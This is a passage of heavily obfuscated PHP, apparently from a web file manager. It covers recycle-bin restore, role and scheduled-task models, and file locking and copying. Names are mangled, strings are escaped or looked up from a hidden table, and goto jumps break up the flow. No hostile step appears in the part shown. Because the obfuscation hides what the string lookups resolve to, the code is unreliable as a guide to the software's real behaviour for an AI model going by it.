$áÓ¿½ìí = $áÓ¿½ìí === !1 ? !1 : $áÓ¿½ìí; $Àø™Ú¤© = array(); foreach ($÷³’©ı“ as $À†ğ½Ï§) { if ($áÓ¿½ìí != !1 && !in_array($À†ğ½Ï§, $áÓ¿½ìí)) { continue; } $•ï¨‡•  = $¡ÃœÜ¦Ê->sourceInfo($À†ğ½Ï§); $¡ÃœÜ¦Ê->remove($À†ğ½Ï§, !1); $¼ş—‡¶ = $•ï¨‡• [$ıßÊ¦İ[187]] . $ıßÊ¦İ[11] . $•ï¨‡• [$ıßÊ¦İ[546]]; $Àø™Ú¤©[$¼ş—‡¶] = array($ıßÊ¦İ[624] => $•ï¨‡• [$ıßÊ¦İ[187]], $ıßÊ¦İ[546] => $•ï¨‡• [$ıßÊ¦İ[546]]); $this->where(array($ıßÊ¦İ[190] => $À†ğ½Ï§))->delete(); } foreach ($Àø™Ú¤© as $¸¨ì÷¿ö) { $¡ÃœÜ¦Ê->targetSpaceUpdate($¸¨ì÷¿ö[$ıßÊ¦İ[187]], $¸¨ì÷¿ö[$ıßÊ¦İ[546]]); } } public function restore($¶ïá“ÉÖ = false) { $¥—Ã¬ó = $this->listData(); $this->_restoreSource($¥—Ã¬ó, $¶ïá“ÉÖ); } public function removeUserAll($ç¢ÀÜ•û) { $this->remove(!1, $ç¢ÀÜ•û); } private function _restoreSource($¨éğÎÉ‡, $ôßˆ«Ú) { $¹€¥„· =& $_SERVER[ˆûùúÊ¯]; $®£ìá÷â = Model($¹€¥„·[1393]); $ôßˆ«Ú = $ôßˆ«Ú == !1 ? !1 : $ôßˆ«Ú; if (!$¨éğÎÉ‡) { return !0; } $¤Ú¶Ñ®Ó = array(); foreach ($¨éğÎÉ‡ as $½Ï­…Ò) { if ($ôßˆ«Ú != !1 && !in_array($½Ï­…Ò, $ôßˆ«Ú)) { continue; } $ÕâŒÓÖÔ = $®£ìá÷â->sourceInfo($½Ï­…Ò); $ìšô°ß­ = $®£ìá÷â->sourceInfo($ÕâŒÓÖÔ[$¹€¥„·[189]]); if ($ìšô°ß­[$¹€¥„·[481]] == $¹€¥„·[98]) { continue; } $®£ìá÷â->lockMoveStart($½Ï­…Ò); $this->recycleMove($½Ï­…Ò, 0); if ($ÕâŒÓÖÔ[$¹€¥„·[461]] == $¹€¥„·[98]) { $”øÌ´‘ñ = array($¹€¥„·[628] => array($¹€¥„·[588], $ÕâŒÓÖÔ[$¹€¥„·[561]] . $½Ï­…Ò . $¹€¥„·[589])); $®£ìá÷â->where($”øÌ´‘ñ)->setField($¹€¥„·[481], 0); $this->restoreFolderChildren($½Ï­…Ò, $¨éğÎÉ‡); } $this->where(array($¹€¥„·[190] => $½Ï­…Ò))->delete(); $®£ìá÷â->folderSizeReset($ÕâŒÓÖÔ[$¹€¥„·[189]]); $¤Ú¶Ñ®Ó[] = $ÕâŒÓÖÔ[$¹€¥„·[189]]; if ($ÕâŒÓÖÔ[$¹€¥„·[461]] == $¹€¥„·[98]) { $¤Ú¶Ñ®Ó[] = $½Ï­…Ò; } $®£ìá÷â->lockMoveEnd($½Ï­…Ò); } $®£ìá÷â->updateModifyTime($¤Ú¶Ñ®Ó); } private function restoreFolderChildren($ö‘Îã”à, $ŸÇÒ’åò) { $ŞªÁÃµ =& $_SERVER[ˆûùúÊ¯]; $‹üí†ñ = Model($ŞªÁÃµ[1393]); $ÇÂğãà = array($ŞªÁÃµ[190] => array($ŞªÁÃµ[7], array())); foreach ($ŸÇÒ’åò as $Ù×Áññ) { if ($Ù×Áññ == $ö‘Îã”à) { continue; } if (!$‹üí†ñ->isParentOf($ö‘Îã”à, $Ù×Áññ)) { continue; } $«Ş…è×Ğ = $‹üí†ñ->sourceInfo($Ù×Áññ); if ($«Ş…è×Ğ[$ŞªÁÃµ[461]] == $ŞªÁÃµ[98]) { $ÇÂğãà[] = array($ŞªÁÃµ[628] => array($ŞªÁÃµ[588], $«Ş…è×Ğ[$ŞªÁÃµ[561]] . $Ù×Áññ . $ŞªÁÃµ[589])); } else { $ÇÂğãà[$ŞªÁÃµ[190]][1][] = $Ù×Áññ; } } if (!$ÇÂğãà[$ŞªÁÃµ[190]][1]) { unset($ÇÂğãà[$ŞªÁÃµ[190]]); } if (!$ÇÂğãà) { return; } if (is_array($ÇÂğãà[$ŞªÁÃµ[190]]) && is_array($ÇÂğãà[$ŞªÁÃµ[190]][1])) { $ÇÂğãà[$ŞªÁÃµ[190]][1] = array_unique($ÇÂğãà[$ŞªÁÃµ[190]][1]); } $ÇÂğãà[$ŞªÁÃµ[1061]] = $ŞªÁÃµ[1994]; $‹üí†ñ->where($ÇÂğãà)->setField($ŞªÁÃµ[481], 1); } private function recycleMove($•¼î± Š, $´¬íßÖ = 1) { $–ÊìÏú¶ =& $_SERVER[ˆûùúÊ¯]; $¶ÔÑ€¢º = Model($–ÊìÏú¶[1393]); $ ¿ôÛÕ = Model($–ÊìÏú¶[2213]); $¶ç«‹Ç = array($–ÊìÏú¶[190] => $•¼î± Š); if ($´¬íßÖ) { $¶ÔÑ€¢º->where($¶ç«‹Ç)->setField($–ÊìÏú¶[481], 1); $ ¿ôÛÕ->eventRecycle($•¼î± Š, $–ÊìÏú¶[2214]); } else { $ãÛñöÔ‚ = $¶ÔÑ€¢º->where($¶ç«‹Ç)->find(); $ê£¢·µ• = $ãÛñöÔ‚[$–ÊìÏú¶[461]] == $–ÊìÏú¶[98]; $òÄêß“Ø = $¶ÔÑ€¢º->fileNameAuto($ãÛñöÔ‚[$–ÊìÏú¶[189]], $ãÛñöÔ‚[$–ÊìÏú¶[42]], REPEAT_RENAME_FOLDER, $ê£¢·µ•); if ($òÄêß“Ø != $ãÛñöÔ‚[$–ÊìÏú¶[42]]) { $¶ÔÑ€¢º->rename($•¼î± Š, $òÄêß“Ø); } $¶ÔÑ€¢º->where($¶ç«‹Ç)->setField($–ÊìÏú¶[481], 0); $ ¿ôÛÕ->eventRecycle($•¼î± Š, $–ÊìÏú¶[2215]); } } } goto A³îÅ­¿ËŸ; C‡í—¡Ü›: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\x72\157\154\145\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\141\165\x74\x68", "\x6c\x61\x62\x65\x6c", "\x64\151\163\x70\x6c\x61\x79", "\163\x79\163\164\145\x6d", "\144\145\x73\x63", "\x69\147\x6e\x6f\x72\x65\x45\x78\164", "\151\147\156\x6f\162\x65\106\151\154\145\123\x69\172\145", "\141\144\x6d\x69\156\151\163\x74\x72\x61\164\157\162", "\163\157\162\x74"); public function listData($ú‘·óîÙ = false, $““§Ÿî¡ = "\163\157\x72\164", $ïİ˜¦¤À = false) { $ÑëÇ¾äæ =& $_SERVER[ˆûùúÊ¯]; $õ–êêç = parent::listData($ú‘·óîÙ, $““§Ÿî¡, $ïİ˜¦¤À); if (!$ú‘·óîÙ) { foreach ($õ–êêç as $ ±ÄµÂâ => $û™ïÂ’°) { if ($û™ïÂ’°[$ÑëÇ¾äæ[2098]] == 1) { $õ–êêç[$ ±ÄµÂâ][$ÑëÇ¾äæ[502]] = LNG($ÑëÇ¾äæ[2337]); } } } return $õ–êêç; } public function update($ÌËíùÄ, $¢Ï´ËÀ–) { $˜™£ÌÒ€ =& $_SERVER[ˆûùúÊ¯]; $’ÂÌâÔÅ = parent::listData($ÌËíùÄ); $ŞÂŞğšæ = $this->findByName($¢Ï´ËÀ–[$˜™£ÌÒ€[42]]); if (!$’ÂÌâÔÅ || $ŞÂŞğšæ && $ŞÂŞğšæ[$˜™£ÌÒ€[451]] != $’ÂÌâÔÅ[$˜™£ÌÒ€[451]]) { return !1; } if ($ŞÂŞğšæ[$˜™£ÌÒ€[2098]] == 1) { $¢Ï´ËÀ– = array($˜™£ÌÒ€[42] => $¢Ï´ËÀ–[$˜™£ÌÒ€[42]], $˜™£ÌÒ€[1919] => $¢Ï´ËÀ–[$˜™£ÌÒ€[1919]]); } $this->filterAuth($¢Ï´ËÀ–[$˜™£ÌÒ€[463]]); return parent::update($ÌËíùÄ, $¢Ï´ËÀ–); } public function remove($Õéæ’Ë) { $’°º Š´ = parent::listData($Õéæ’Ë); if (!$’°º Š´ || $’°º Š´[$_SERVER[ˆûùúÊ¯][188]]) { return !1; } return parent::remove($Õéæ’Ë); } public function add($¦‰ÄëçŸ) { $âœõÛÚ =& $_SERVER[ˆûùúÊ¯]; $ä±Ş = $¦‰ÄëçŸ[$âœõÛÚ[42]]; if ($this->findByName($ä±Ş)) { return !1; } $Ò††ú× = array($âœõÛÚ[470] => $ä±Ş, $âœõÛÚ[1902] => $âœõÛÚ[12], $âœõÛÚ[1898] => $âœõÛÚ[1906], $âœõÛÚ[2338] => 1, $âœõÛÚ[1901] => 0, $âœõÛÚ[2339] => 0, $âœõÛÚ[1900] => $this->getSort()); $¦‰ÄëçŸ = array_merge($Ò††ú×, $¦‰ÄëçŸ); $this->filterAuth($¦‰ÄëçŸ[$âœõÛÚ[463]]); return parent::insert($¦‰ÄëçŸ); } private function getSort() { $ã¡“¦á„ =& $_SERVER[ˆûùúÊ¯]; $ÌÎŸ†› = parent::listData(); $ı³¬êÁ¤ = array_to_keyvalue($ÌÎŸ†›, $ã¡“¦á„[12], $ã¡“¦á„[1920]); return empty($ı³¬êÁ¤) ? 0 : max($ı³¬êÁ¤) + 1; } private function filterAuth(&$Â×•÷˜) { $ù¡ˆª’š =& $_SERVER[ˆûùúÊ¯]; $Ë²ËîĞ = array(); $™­Âœıœ = array_filter(explode($ù¡ˆª’š[60], $Â×•÷˜)); foreach ($™­Âœıœ as $Â×•÷˜) { $„ç¯³÷ = explode($ù¡ˆª’š[10], $Â×•÷˜); if ($„ç¯³÷[0] == $ù¡ˆª’š[2340] && $„ç¯³÷[1] != $ù¡ˆª’š[1251]) { $µ­µñ³ = $„ç¯³÷[0] . $ù¡ˆª’š[10] . $„ç¯³÷[1] . $ù¡ˆª’š[2341]; if (!in_array($µ­µñ³, $™­Âœıœ)) { $Ë²ËîĞ[] = $µ­µñ³; } } $Ë²ËîĞ[] = $Â×•÷˜; } $Â×•÷˜ = implode($ù¡ˆª’š[60], $Ë²ËîĞ); } public function findRoleDefault() { $ºÉÎ…¿Œ =& $_SERVER[ˆûùúÊ¯]; $•›Ò“à’ = parent::listData(); $†ÒšÁÍƒ = !1; foreach ($•›Ò“à’ as $†«¯”¥†) { if (!$†«¯”¥† || $†«¯”¥†[$ºÉÎ…¿Œ[1918]] == $ºÉÎ…¿Œ[221] || $†«¯”¥†[$ºÉÎ…¿Œ[2098]] == 1) { continue; } if (strstr($†«¯”¥†[$ºÉÎ…¿Œ[463]], $ºÉÎ…¿Œ[2342])) { continue; } if (!strstr($†«¯”¥†[$ºÉÎ…¿Œ[463]], $ºÉÎ…¿Œ[2343])) { continue; } if (!$†ÒšÁÍƒ) { $†ÒšÁÍƒ = $†«¯”¥†; continue; } $ò°ñê§À = explode($ºÉÎ…¿Œ[60], $†ÒšÁÍƒ[$ºÉÎ…¿Œ[463]]); $Çæ™ú•› = explode($ºÉÎ…¿Œ[60], $†«¯”¥†[$ºÉÎ…¿Œ[463]]); if (count($ò°ñê§À) > count($Çæ™ú•›)) { $†ÒšÁÍƒ = $†«¯”¥†; } } return $†ÒšÁÍƒ ? $†ÒšÁÍƒ[$ºÉÎ…¿Œ[451]] : $ºÉÎ…¿Œ[12]; } public function sort($¥·§²ìã, $‘–î¿¡ì) { return parent::update($¥·§²ìã, $‘–î¿¡ì); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\164\x61\163\x6b\114\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\164\171\160\x65", "\145\x76\145\156\x74", "\164\x69\155\145", "\144\x65\x73\x63", "\163\171\163\164\145\x6d", "\x65\156\141\142\154\145", "\x6c\141\163\164\122\165\156", "\163\157\162\x74"); public function listData($Ì­¹Äå§ = false, $ß…İ«ŸĞ = "\163\157\x72\x74", $èôÌ¦«Ë = false) { return parent::listData($Ì­¹Äå§, $ß…İ«ŸĞ, $èôÌ¦«Ë); } public function add($ä¡…˜´Å) { $Öğë³ì« =& $_SERVER[ˆûùúÊ¯]; $âù•© = $this->findByName($ä¡…˜´Å[$Öğë³ì«[42]]); if ($âù•©) { return !1; } $ä¡…˜´Å[$Öğë³ì«[1661]] = 0; $ä¡…˜´Å[$Öğë³ì«[1920]] = $this->getSort(); return parent::insert($ä¡…˜´Å); } private function getSort() { $™“¯ìŒ¼ =& $_SERVER[ˆûùúÊ¯]; $Ô‰ó¡ = parent::listData(); $ÏışüùÚ = array_to_keyvalue($Ô‰ó¡, $™“¯ìŒ¼[12], $™“¯ìŒ¼[1920]); return empty($ÏışüùÚ) ? 0 : max($ÏışüùÚ) + 1; } public function update($Öü¡‹Ê, $äÚä‡§”) { $´Ï¾çÏÔ =& $_SERVER[ˆûùúÊ¯]; $óÓ™¨Œè = $this->listData($Öü¡‹Ê); $ŒÆöÏô = $this->findByName($äÚä‡§”[$´Ï¾çÏÔ[42]]); if (!$óÓ™¨Œè || $ŒÆöÏô && $ŒÆöÏô[$´Ï¾çÏÔ[451]] != $óÓ™¨Œè[$´Ï¾çÏÔ[451]]) { return !1; } return parent::update($Öü¡‹Ê, $äÚä‡§”); } public function remove($µ¾é´’ü, $âéà÷‡ = false) { $èàİ×¥Ô =& $_SERVER[ˆûùúÊ¯]; $Í¿‹’Ú¿ = $this->listData($µ¾é´’ü); if (!$Í¿‹’Ú¿) { return; } if (!$âéà÷‡ && $Í¿‹’Ú¿[$èàİ×¥Ô[188]] == $èàİ×¥Ô[98]) { return !1; } return parent::remove($µ¾é´’ü); } public function enable($·ãÃ½±, $ùÒµÈÛ–) { return $this->update($·ãÃ½±, array($_SERVER[ˆûùúÊ¯][2332] => $ùÒµÈÛ–)); } public function run($¬’¨Ü»±) { return $this->update($¬’¨Ü»±, array($_SERVER[ˆûùúÊ¯][2344] => time())); } } goto AÉÏÚ…í£; FÀÑòÃ˜µä: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Úâô¡—) { $®û•·‹· =& $_SERVER[ˆûùúÊ¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($®û•·‹·[594], $Úâô¡—); $…ˆíãÒ = 1; $this->_lockEvent($Úâô¡—, array($®û•·‹·[595], $®û•·‹·[596]), $…ˆíãÒ); $this->_lockParent($Úâô¡—, array($®û•·‹·[596]), $…ˆíãÒ); $this->_lockEvent($Úâô¡—, array($®û•·‹·[597], $®û•·‹·[598]), $…ˆíãÒ); $this->_lockCheckEnd($®û•·‹·[594], $Úâô¡—); } public function lockCopyEnd($÷ø¬‹•Í) { $ÂÅâ¬¢Î =& $_SERVER[ˆûùúÊ¯]; if (!$this->allowLock()) { return; } $½Œ‚æ·‘ = 0; $this->_lockEvent($÷ø¬‹•Í, array($ÂÅâ¬¢Î[595], $ÂÅâ¬¢Î[596]), $½Œ‚æ·‘); $this->_lockParent($÷ø¬‹•Í, array($ÂÅâ¬¢Î[596]), $½Œ‚æ·‘); $this->_lockEvent($÷ø¬‹•Í, array($ÂÅâ¬¢Î[597], $ÂÅâ¬¢Î[598]), $½Œ‚æ·‘); } public function lockWriteStart($‡ı¥—Àö, $ê×§ÁÒ— = '') { $ˆùÇ¦Åø =& $_SERVER[ˆûùúÊ¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($ˆùÇ¦Åø[595], $‡ı¥—Àö); $ÔŒ†£Õ = 1; $this->_lockKey($ˆùÇ¦Åø[599] . $‡ı¥—Àö . $ˆùÇ¦Åø[10] . $ê×§ÁÒ—, $ÔŒ†£Õ); $this->_lockEvent($‡ı¥—Àö, array($ˆùÇ¦Åø[594], $ˆùÇ¦Åø[596]), $ÔŒ†£Õ); $this->_lockParent($‡ı¥—Àö, array($ˆùÇ¦Åø[594], $ˆùÇ¦Åø[596]), $ÔŒ†£Õ); $this->_lockCheckEnd($ˆùÇ¦Åø[595], $‡ı¥—Àö); } public function lockWriteEnd($©œ’¿¯º, $Œ×³ïº = '') { $¢æÖßïÕ =& $_SERVER[ˆûùúÊ¯]; if (!$this->allowLock()) { return; } $Í–¢Û·é = 0; $this->_lockKey($¢æÖßïÕ[599] . $©œ’¿¯º . $¢æÖßïÕ[10] . $Œ×³ïº, $Í–¢Û·é); $this->_lockEvent($©œ’¿¯º, array($¢æÖßïÕ[594], $¢æÖßïÕ[596]), $Í–¢Û·é); $this->_lockParent($©œ’¿¯º, array($¢æÖßïÕ[594], $¢æÖßïÕ[596]), $Í–¢Û·é); } public function lockMoveStart($¢–Š«ÌÔ) { $½¡‘³ë =& $_SERVER[ˆûùúÊ¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($½¡‘³ë[596], $¢–Š«ÌÔ); $×ØÍˆúÁ = 1; $this->_lockKey($½¡‘³ë[600] . $¢–Š«ÌÔ, $×ØÍˆúÁ); $this->_lockEvent($¢–Š«ÌÔ, array($½¡‘³ë[594], $½¡‘³ë[595]), $×ØÍˆúÁ); $this->_lockParent($¢–Š«ÌÔ, array($½¡‘³ë[594], $½¡‘³ë[596]), $×ØÍˆúÁ); $this->_lockEvent($¢–Š«ÌÔ, array($½¡‘³ë[601], $½¡‘³ë[597], $½¡‘³ë[598]), $×ØÍˆúÁ); $this->_lockCheckEnd($½¡‘³ë[596], $¢–Š«ÌÔ); } public function lockMoveEnd($æÇ¾¹ÂÚ) { $õ×÷¥Ÿ± =& $_SERVER[ˆûùúÊ¯]; if (!$this->allowLock()) { return; } $õ¸Ù¬ÍÓ = 0; $this->_lockKey($õ×÷¥Ÿ±[600] . $æÇ¾¹ÂÚ, $õ¸Ù¬ÍÓ); $this->_lockEvent($æÇ¾¹ÂÚ, array($õ×÷¥Ÿ±[594], $õ×÷¥Ÿ±[595]), $õ¸Ù¬ÍÓ); $this->_lockParent($æÇ¾¹ÂÚ, array($õ×÷¥Ÿ±[594], $õ×÷¥Ÿ±[596]), $õ¸Ù¬ÍÓ); $this->_lockEvent($æÇ¾¹ÂÚ, array($õ×÷¥Ÿ±[601], $õ×÷¥Ÿ±[597], $õ×÷¥Ÿ±[598]), $õ¸Ù¬ÍÓ); } private function _lockCheck($äÑ…á«„, $¨ù¦ëšÛ) { $Á¡£´©„ =& $_SERVER[ˆûùúÊ¯]; $ÄÓŠ§¡é = $this->sourceInfo($¨ù¦ëšÛ); $ »Îşş = $äÑ…á«„ . $Á¡£´©„[10] . $¨ù¦ëšÛ; $this->_lockTimeStart[$ »Îşş] = timeFloat(); if (!is_array($ÄÓŠ§¡é)) { return; } $â‰‰ùêó = LNG($Á¡£´©„[602]); CacheLock::setErrorMsg($Á¡£´©„[172] . htmlspecialchars($ÄÓŠ§¡é[$Á¡£´©„[42]]) . $Á¡£´©„[174] . $â‰‰ùêó); $this->_lockKey($ »Îşş, 1); $this->_lockKey($ »Îşş, 0); $‘ÉÉèÈ‚ = array_reverse($this->parentLevelArray($ÄÓŠ§¡é[$Á¡£´©„[561]])); foreach ($‘ÉÉèÈ‚ as $ä†ÛÕˆÀ) { $ »Îşş = $äÑ…á«„ . $Á¡£´©„[603] . $ä†ÛÕˆÀ; if (CacheLock::lockGet($Á¡£´©„[604] . $ »Îşş)) { $ÄÓŠ§¡é = $this->sourceInfo($ä†ÛÕˆÀ); CacheLock::setErrorMsg($Á¡£´©„[172] . htmlspecialchars($ÄÓŠ§¡é[$Á¡£´©„[42]]) . $Á¡£´©„[174] . $â‰‰ùêó); $this->_lockKey($ »Îşş, 1); $this->_lockKey($ »Îşş, 0); } } } private function _lockCheckEnd($û…êÄ¾, $ìÍĞ œó) { $ÏëëßÑÊ =& $_SERVER[ˆûùúÊ¯]; $ôÀˆÈ»õ = $û…êÄ¾ . $ÏëëßÑÊ[10] . $ìÍĞ œó; CacheLock::setErrorMsg($ÏëëßÑÊ[430]); if (!isset($this->_lockTimeStart[$ôÀˆÈ»õ])) { return; } $Ùš„±İç = timeFloat() - $this->_lockTimeStart[$ôÀˆÈ»õ]; unset($this->_lockTimeStart[$ôÀˆÈ»õ]); if ($Ùš„±İç > 0.5) { unset(self::$cacheSourceInfo[$ÏëëßÑÊ[509] . $ìÍĞ œó]); } $ âÃĞª = $this->sourceInfo($ìÍĞ œó); if (!$ âÃĞª) { show_json(LNG($ÏëëßÑÊ[115]), !1); } } private function _lockParent($ß°Ãö…œ, $¶·óÇ…Ò, $’Ğ¢×Ï) { if (!$this->autoLockSet) { return; } $ëÁ¤¡ = $this->sourceInfo($ß°Ãö…œ); if (!is_array($ëÁ¤¡)) { return; } $òÑ‹ƒŒÅ = array_reverse($this->parentLevelArray($ëÁ¤¡[$_SERVER[ˆûùúÊ¯][561]])); foreach ($òÑ‹ƒŒÅ as $ìÔ†¯»Î) { $this->_lockEvent($ìÔ†¯»Î, $¶·óÇ…Ò, $’Ğ¢×Ï); } } private function _lockEvent($Öô®Ì­‘, $¥”—ûæğ, $ÀÂšúì) { $Ä¡‹¼ÁÄ =& $_SERVER[ˆûùúÊ¯]; if (!$this->autoLockSet) { return; } foreach ($¥”—ûæğ as $š²â¤õ³) { $åÁ´Û®µ = $š²â¤õ³ . $Ä¡‹¼ÁÄ[10] . $Öô®Ì­‘; if ($ÀÂšúì && CacheLock::lockGet($Ä¡‹¼ÁÄ[604] . $åÁ´Û®µ)) { continue; } $this->_lockKey($åÁ´Û®µ, $ÀÂšúì); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ÚÒîšñÍ, $¦öõ•ÍØ = 1) { $­·¢®ŠÙ = $_SERVER[ˆûùúÊ¯][604] . md5($ÚÒîšñÍ); if ($¦öõ•ÍØ) { if (isset(self::$_lockItemArr[$­·¢®ŠÙ])) { return; } self::$_lockItemArr[$­·¢®ŠÙ] = 1; CacheLock::lock($­·¢®ŠÙ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$­·¢®ŠÙ])) { return; } unset(self::$_lockItemArr[$­·¢®ŠÙ]); CacheLock::unlock($­·¢®ŠÙ); } } public function isParentOf($‚¡ Ù, $ß…É¾¼) { $Ä’èó¡° =& $_SERVER[ˆûùúÊ¯]; $Í•è±ÌŒ = $this->sourceInfo($‚¡ Ù); $½çâî = $this->sourceInfo($ß…É¾¼); $°¶ó¸‹‘ = $Í•è±ÌŒ[$Ä’èó¡°[561]] . $Í•è±ÌŒ[$Ä’èó¡°[190]] . $Ä’èó¡°[60]; $Ö¡÷ß­Û = $½çâî[$Ä’èó¡°[561]] . $½çâî[$Ä’èó¡°[190]] . $Ä’èó¡°[60]; $“ñÈ’½Õ = strpos($Ö¡÷ß­Û, $°¶ó¸‹‘) === 0; return $“ñÈ’½Õ; } private $targetIsDelete = 0; public function copy($©Œõ»Ó, $†©ı§é¸, $ô«îŸ© = REPEAT_REPLACE, $×›‰ê¬Ö = '') { $Î×ÂŸ°é =& $_SERVER[ˆûùúÊ¯]; $’öå²Ç¿ = $this->sourceInfo($©Œõ»Ó); $Š’ñ”ÉÇ = $this->sourceInfo($†©ı§é¸); if (!$’öå²Ç¿ || !$Š’ñ”ÉÇ || $Š’ñ”ÉÇ[$Î×ÂŸ°é[461]] != $Î×ÂŸ°é[98]) { return !1; } if ($this->isParentOf($©Œõ»Ó, $†©ı§é¸)) { return !1; } $²–©Šà¡ = $×›‰ê¬Ö ? $×›‰ê¬Ö : $’öå²Ç¿[$Î×ÂŸ°é[42]]; $this->lockCopyStart($©Œõ»Ó); $this->lockWriteStart($†©ı§é¸, $²–©Šà¡); $ü³öÒ£ = array($Î×ÂŸ°é[605] => array(), $Î×ÂŸ°é[606] => array(), $Î×ÂŸ°é[607] => array()); $this->targetIsDelete = intval($’öå²Ç¿[$Î×ÂŸ°é[481]]); $ç¢ÆñÁâ = $this->fileNameExistCache($†©ı§é¸, $’öå²Ç¿[$Î×ÂŸ°é[42]]); $ßË‚ùÃİ = $this->_copy($©Œõ»Ó, $†©ı§é¸, $ô«îŸ©, $ü³öÒ£, !0, $×›‰ê¬Ö); $this->_childrenListClear(); $this->lockCopyEnd($©Œõ»Ó); $this->lockWriteEnd($†©ı§é¸, $²–©Šà¡); if ($’öå²Ç¿[$Î×ÂŸ°é[461]] == $Î×ÂŸ°é[98] && $ç¢ÆñÁâ == $ßË‚ùÃİ) { $this->folderSizeResetChildren($ç¢ÆñÁâ); } Model($Î×ÂŸ°é[608])->addAll($ü³öÒ£[$Î×ÂŸ°é[606]], array(), !0); if ($ç¢ÆñÁâ != $ßË‚ùÃİ || $’öå²Ç¿[$Î×ÂŸ°é[461]] == $Î×ÂŸ°é[98]) { Model($Î×ÂŸ°é[609])->eventCopy($ßË‚ùÃİ); } $this->saveAll($ü³öÒ£[$Î×ÂŸ°é[607]]); Model($Î×ÂŸ°é[223])->linkAdd($ü³öÒ£[$Î×ÂŸ°é[605]]); $this->folderSizeReset($†©ı§é¸); $this->updateModifyTime($†©ı§é¸); return $ßË‚ùÃİ; } private function _copy($÷ï’–óŒ, $Øûò–ê…, $¹àéØ·, &$ø–‚õµ, $ü–Ü‘úş, $ŸâÇ‰È = '') { $Ò¦ÚÊà =& $_SERVER[ˆûùúÊ¯]; $¬ğù§Ç = $this->sourceInfoCache($÷ï’–óŒ); $¾ç‚ˆ“À = $¬ğù§Ç[$Ò¦ÚÊà[461]] == $Ò¦ÚÊà[98]; $ô§Û¨Üñ = $ŸâÇ‰È ? $ŸâÇ‰È : $¬ğù§Ç[$Ò¦ÚÊà[42]]; $å¬¯õç© = $this->fileNameExistCache($Øûò–ê…, $ô§Û¨Üñ); if ($ü–Ü‘úş) { $this->_childrenAllMake($÷ï’–óŒ); if ($¾ç‚ˆ“À && $å¬¯õç©) { $this->_childrenAllMake($å¬¯õç©); } } if (!$å¬¯õç©) { return $this->_copyCreate($÷ï’–óŒ, $Øûò–ê…, $ô§Û¨Üñ, $ø–‚õµ); } $”İùãÜ’ = $å¬¯õç©; if ($¾ç‚ˆ“À) { if ($¹àéØ· == REPEAT_RENAME_FOLDER) { $ô§Û¨Üñ = $this->fileNameAutoCache($Øûò–ê…, $ô§Û¨Üñ, $¹àéØ·, $¾ç‚ˆ“À); $”İùãÜ’ = $this->_copyCreate($÷ï’–óŒ, $Øûò–ê…, $ô§Û¨Üñ, $ø–‚õµ); } else { $ó„ö¨Úı = $this->_childrenList($÷ï’–óŒ); foreach ($ó„ö¨Úı as $¿µ ¾¸æ) { $this->_copy($¿µ ¾¸æ[$Ò¦ÚÊà[190]], $å¬¯õç©, $¹àéØ·, $ø–‚õµ, !1); } } } else { if ($¹àéØ· == REPEAT_RENAME || $¹àéØ· == REPEAT_RENAME_FOLDER) { $ô§Û¨Üñ = $this->fileNameAutoCache($Øûò–ê…, $ô§Û¨Üñ, $¹àéØ·, $¾ç‚ˆ“À); $”İùãÜ’ = $this->_copyCreate($÷ï’–óŒ, $Øûò–ê…, $ô§Û¨Üñ, $ø–‚õµ); } else { if ($¹àéØ· == REPEAT_REPLACE) { $¿Å‰ÅØû = $this->sourceInfoCache($å¬¯õç©); $€ğÒç = $this->fileHistory($¿Å‰ÅØû, $¬ğù§Ç[$Ò¦ÚÊà[517]], $¬ğù§Ç[$Ò¦ÚÊà[86]]); if ($€ğÒç) { $ø–‚õµ[$Ò¦ÚÊà[605]][] = $¬ğù§Ç[$Ò¦ÚÊà[517]]; } } else { if ($¹àéØ· == REPEAT_SKIP) { } } } Hook::trigger($Ò¦ÚÊà[610], array($Ò¦ÚÊà[611], $¬ğù§Ç, 0)); } return $”İùãÜ’; } private function _copyCreate($Ç®æƒóß, $³ŞóÂâ±, $Ò±š§ŸÓ, &$€õº‹Ø®) { $ÈÍ™ùÚÉ =& $_SERVER[ˆûùúÊ¯]; $°›ãÏ¹Ë = $this->sourceInfoCache($Ç®æƒóß); $¦†ƒğ = $this->sourceInfoCache($³ŞóÂâ±); $†ó†›–ï = $this->_makeItemData($°›ãÏ¹Ë, $¦†ƒğ, $Ò±š§ŸÓ); Hook::trigger($ÈÍ™ùÚÉ[612], $†ó†›–ï); Hook::trigger($ÈÍ™ùÚÉ[613], array($ÈÍ™ùÚÉ[614], $†ó†›–ï, 0)); $Ã…€µ§ = $this->add($†ó†›–ï); $Ş”…ış™ = array($ÈÍ™ùÚÉ[190] => $Ã…€µ§, $ÈÍ™ùÚÉ[42] => $Ò±š§ŸÓ); $this->_copyApplyMeta($Ş”…ış™, $€õº‹Ø®); if ($°›ãÏ¹Ë[$ÈÍ™ùÚÉ[461]] != $ÈÍ™ùÚÉ[98]) { $€õº‹Ø®[$ÈÍ™ùÚÉ[605]][] = $°›ãÏ¹Ë[$ÈÍ™ùÚÉ[517]]; return $Ã…€µ§; } $ëÍ•±«Ì = array(); $ˆÖÄŒÄ = array(); $this->_childrenListAll($Ç®æƒóß, $ëÍ•±«Ì); $ï³‚ÙÅ¨ = count($ëÍ•±«Ì); if ($ï³‚ÙÅ¨ == 0) { return $Ã…€µ§; } $ß¨Ñ”Ä = $this->sourceInfo($Ã…€µ§); foreach ($ëÍ•±«Ì as $Ìú³Ø‘ä) { $Â±úóŠµ = $this->_makeItemData($Ìú³Ø‘ä, $ß¨Ñ”Ä, $Ìú³Ø‘ä[$ÈÍ™ùÚÉ[42]]); $Â±úóŠµ[$ÈÍ™ùÚÉ[561]] = $Ìú³Ø‘ä[$ÈÍ™ùÚÉ[561]]; $ˆÖÄŒÄ[] = $Â±úóŠµ; } $this->chunkEventSet($ÈÍ™ùÚÉ[615], array($ÈÍ™ùÚÉ[616], $†ó†›–ï, $ï³‚ÙÅ¨)); 